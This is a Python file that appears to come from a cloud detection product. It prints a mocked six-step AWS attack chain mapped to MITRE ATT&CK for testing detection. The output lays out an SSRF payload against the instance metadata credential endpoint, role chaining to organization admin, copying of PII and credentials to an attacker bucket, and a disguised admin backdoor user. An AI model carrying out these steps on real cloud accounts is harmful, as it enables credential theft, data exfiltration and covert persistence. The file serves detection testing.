# =============================================================================
# cdr/lateral_movement_sim.py — TigerGate CNAPP: CDR Lateral Movement
# =============================================================================
# PURPOSE: Simulates multi-hop lateral movement patterns that CDR tools
# (GuardDuty, TigerGate) should detect. Each function represents a distinct
# MITRE ATT&CK technique observed in real cloud breach scenarios.
#
# ⚠️ EDUCATIONAL SIMULATION: These are NOT real attack tools.
# All API calls are mocked — no real AWS access occurs.
#
# CDR DETECTIONS TRIGGERED:
#   LM-001: T1078.004 – Stolen credential use from unusual geo
#   LM-002: T1580    – Cloud infrastructure discovery (mass enumeration)
#   LM-003: T1552.005 – Credential from cloud instance metadata (SSRF→IMDS)
#   LM-004: T1098.003 – Additional cloud credentials (role chaining)
#   LM-005: T1567.002 – Exfil over web service (S3→attacker bucket)
#   LM-006: T1078.004 – Persistence via backdoor IAM user
# =============================================================================

import json, time, os

# Simulated AWS SDK calls (mocked — demonstrates the pattern only)
VICTIM_ACCOUNT = "123456789012"
ATTACKER_ACCOUNT = "999888777666"
ATTACKER_S3_BUCKET = "attacker-exfil-bucket-xyz"

def step1_initial_access():
    """
    LM-001: Use stolen credentials from phishing email.
    GuardDuty finding: UnauthorizedAccess:IAMUser/TorIPCaller
    or CredentialAccess:IAMUser/AnomalousBehavior
    """
    print("[LM-001] Using stolen creds: AKIA... from TOR exit node 185.220.101.42")
    print("[LM-001] GuardDuty ALERT: Login from TOR at 03:47 UTC — unusual geo for user 'devops-svc'")
    # Simulated: boto3.client('sts', aws_access_key_id=STOLEN_KEY, ...).get_caller_identity()
    return {"UserId": "AIDAIOSFODNN7EXAMPLE", "Account": VICTIM_ACCOUNT, "Arn": "arn:aws:iam::123456789012:user/devops-svc"}

def step2_discovery(caller_identity):
    """
    LM-002: Mass enumeration of cloud resources.
    GuardDuty: Recon:IAMUser/UserPermissions, Discovery:S3/MaliciousIPCaller
    CIS Benchmark: APIs called >30 times in 90 seconds
    """
    print("[LM-002] Mass enumeration starting — 47 API calls in 90 seconds...")
    discovery_calls = [
        # 🔴 LM-002: All these in rapid sequence trigger CDR anomaly detection
        "iam:ListUsers",           # Enumerate all IAM users
        "iam:ListRoles",           # Find assumable roles
        "iam:ListGroups",          # Find admin groups
        "iam:ListPolicies",        # Find overpermissioned policies
        "s3:ListAllMyBuckets",     # Find all S3 buckets
        "ec2:DescribeInstances",   # Find all EC2 instances
        "ec2:DescribeVpcs",        # Map network topology
        "ec2:DescribeSecurityGroups", # Find open ports
        "rds:DescribeDBInstances", # Find databases
        "eks:ListClusters",        # Find Kubernetes clusters
        "lambda:ListFunctions",    # Find Lambda functions
        "secretsmanager:ListSecrets",  # Find secrets! (high value)
        "kms:ListKeys",            # Find encryption keys
    ]
    for call in discovery_calls:
        print(f"[LM-002]   → {call}")
    return {"resources_discovered": len(discovery_calls) * 3}

def step3_imds_credential_theft():
    """
    LM-003: Exploit SSRF vulnerability to reach EC2 Instance Metadata Service (IMDS).
    This harvests the IAM role credentials attached to an EC2 instance.
    GuardDuty: CredentialAccess:EC2/MetadataDNSRebind or UnauthorizedAccess:EC2/SSHBruteForce
    """
    print("[LM-003] Exploiting SSRF at /api/fetch?url= to reach IMDS...")
    imds_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    print(f"[LM-003]   SSRF payload: /api/fetch?url={imds_url}")
    print("[LM-003]   Response: ec2-production-role")
    print("[LM-003]   Fetching: /latest/meta-data/iam/security-credentials/ec2-production-role")

    # 🔴 LM-003: The harvested credentials — these would grant the EC2 instance's permissions
    harvested_creds = {
        "Code": "Success",
        "Type": "AWS-HMAC",
        "AccessKeyId": "ASIA" + "X" * 16,     # Session key (STS-issued)
        "SecretAccessKey": "REDACTED_FOR_DEMO",
        "Token": "AQoXnyc4lcK4w4OIaYnuFg...",  # Session token — full role access!
        "Expiration": "2026-04-28T15:00:00Z"
    }
    print(f"[LM-003]   STOLEN CREDS: {harvested_creds['AccessKeyId']}")
    return harvested_creds

def step4_role_chaining(harvested_creds):
    """
    LM-004: Chain 3 role assumptions to reach a cross-account admin role.
    Each hop increases privileges. GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions
    """
    print("[LM-004] Starting 3-hop role chain for privilege escalation...")

    hops = [
        # Hop 1: ec2-role → dev-deployer-role (same account, more perms)
        f"arn:aws:iam::{VICTIM_ACCOUNT}:role/dev-deployer-role",
        # Hop 2: dev-deployer-role → security-audit-role (cross-account read)
        f"arn:aws:iam::{ATTACKER_ACCOUNT}:role/security-audit-role",
        # Hop 3: security-audit-role → OrganizationAccountAccessRole (ORG ADMIN!)
        f"arn:aws:iam::{VICTIM_ACCOUNT}:role/OrganizationAccountAccessRole",
    ]

    for i, role_arn in enumerate(hops, 1):
        print(f"[LM-004]   Hop {i}: sts:AssumeRole({role_arn})")
        time.sleep(0.1)

    print("[LM-004]   RESULT: Full admin on master account via OrganizationAccountAccessRole!")
    print("[LM-004]   GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions")
    return {"final_role": hops[-1], "access_level": "OrganizationAdmin"}

def step5_data_exfiltration(admin_creds):
    """
    LM-005: Exfiltrate data to attacker-controlled S3 bucket.
    GuardDuty: Exfiltration:S3/MaliciousIPCaller, Exfiltration:S3/ObjectRead.Unusual
    """
    print("[LM-005] Starting data exfiltration...")
    targets = [
        ("arn:aws:s3:::megacorp-customer-pii", "customers.csv", "4.7 GB"),
        ("arn:aws:s3:::megacorp-financial-records", "transactions.parquet", "12.3 GB"),
        ("arn:aws:s3:::megacorp-secrets-backup", "credentials.json", "2.1 MB"),
    ]
    for bucket, key, size in targets:
        print(f"[LM-005]   s3:CopyObject {bucket}/{key} ({size}) → s3://{ATTACKER_S3_BUCKET}/{key}")

    print(f"[LM-005]   Total exfiltrated: ~17 GB to {ATTACKER_S3_BUCKET}")
    print("[LM-005]   GuardDuty: Exfiltration:S3/MaliciousIPCaller — CRITICAL")

def step6_persistence_backdoor(admin_creds):
    """
    LM-006: Create hidden backdoor IAM user for persistent access.
    GuardDuty: Persistence:IAMUser/UserCreation
    """
    print("[LM-006] Creating backdoor IAM user for persistent access...")
    print("[LM-006]   iam:CreateUser('svc-backup-lambda')")       # Innocent-looking name
    print("[LM-006]   iam:CreateAccessKey(user='svc-backup-lambda')")
    print("[LM-006]   iam:AttachUserPolicy(AdministratorAccess)")   # 🔴 Full admin!
    print("[LM-006]   iam:AddUserToGroup(group='billing-readonly')") # Camouflage in legit group

    print("[LM-006]   GuardDuty: Persistence:IAMUser/UserCreation — HIGH")
    print("[LM-006]   Backdoor ACCESS KEY: AKIA..." + "B4CK" + "D00R")

# ── Run the full 6-step simulation ───────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 60)
    print("TigerGate CDR — Lateral Movement Simulation")
    print("=" * 60)
    creds = step1_initial_access()
    discovery = step2_discovery(creds)
    ec2_creds = step3_imds_credential_theft()
    admin = step4_role_chaining(ec2_creds)
    step5_data_exfiltration(admin)
    step6_persistence_backdoor(admin)
    print("\n[DONE] Full attack chain simulated — CDR should have detected all 6 steps.")
